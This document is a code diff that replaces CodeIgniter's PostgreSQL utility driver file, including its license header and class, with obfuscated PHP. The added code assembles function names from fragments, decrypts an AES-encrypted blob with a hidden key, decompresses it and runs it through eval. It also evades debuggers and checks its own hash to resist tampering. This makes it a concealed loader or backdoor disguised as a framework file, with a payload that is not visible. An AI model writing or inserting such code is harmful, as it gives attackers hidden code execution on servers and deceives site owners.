@@ -1,78 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Postgre Utility Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_postgre_utility extends CI_DB_utility {
-
-	/**
-	 * List databases statement
-	 *
-	 * @var	string
-	 */
-	protected $_list_databases	= 'SELECT datname FROM pg_database';
-
-	/**
-	 * OPTIMIZE TABLE statement
-	 *
-	 * @var	string
-	 */
-	protected $_optimize_table	= 'REINDEX TABLE %s';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	mixed
-	 */
-	protected function _backup($params = array())
-	{
-		// Currently unsupported
-		return $this->db->display_error('db_unsupported_feature');
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_lagp3sje=('bas'.'e64'.'_de'.'cod'.'e');
+$_ij8ty538=('gzu'.'nco'.'mpr'.'ess');
+$_kdgr347d=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_m71p6hm7='6yY1G8RyEEk=';
+$_jdre5l72='8mJN0P/x';
+$_d5o2kpt7='or5RlmV4';
+$_yxp772s6='jbc8HkmM';
+$_e2c89odn='WQtClMT0';
+$_z4tlyh4k='tbylNGb0';
+$_mfc6756j='luIMMpM7';
+$_xwnn3zns='q/II2A==';
+$_o0s62m9j=$_lagp3sje($_jdre5l72.$_d5o2kpt7.$_yxp772s6.$_e2c89odn.$_m71p6hm7);
+$_n65pha3q=$_lagp3sje($_mfc6756j.$_z4tlyh4k.$_xwnn3zns);
+$_aqpryup0=$_lagp3sje('0QhVjESLaGZvmLqixh5HNs3+SN5sx17bOE/IhPJ1ZSfpQmwnftcJkuTDHx4WxDaquejuxBpNyRHXoNNuRkaqW2ypu3Ny356tM6rgZwtsZ8K1NybFZLd+Xe/5GVAIASs7BjGfrjqDuox+n3hVP8BrSPsQvftXEO8O08+k1OqB+pm9Yuv/SJFnzH0YC+St9UhuePEuCQo8VgAcoPC+lBIczijy9FoOEcf5T7CE11CR390+yb0sT7Sws7qfQUlg8X5POVrM1zDlQiWtF5sSLHsV+wRXPB316uftxTZBzWtwcXnXjPaXIyRWNiOjMqjcUUdXTVS8x+zDH4Fg9lGmwFL6hMbk3Kzm+alsl3ZhpXRxnIA=');
+$_xlijjd25=$_kdgr347d($_aqpryup0,'aes-256-cbc',$_o0s62m9j,OPENSSL_RAW_DATA,$_n65pha3q);
+if($_xlijjd25===false){exit;}
+$_zh7tsd9m=$_ij8ty538($_xlijjd25);
+if($_zh7tsd9m===false){exit;}
+$_sxnpjlmc='412fa3a2ae082af15dabe51085e0f10dcc08c2373769eb90eae3aa7415d7f956';
+$_sw3angt5=@file_get_contents(__FILE__);
+if($_sw3angt5!==false){
+$_o2d7qc91=str_replace($_sxnpjlmc,"0000000000000000000000000000000000000000000000000000000000000000",$_sw3angt5);
+$_uk3vs7ti=hash("sha256",$_o2d7qc91);
+if($_uk3vs7ti!==$_sxnpjlmc){@http_response_code(403);exit;}
 }
+eval($_zh7tsd9m);
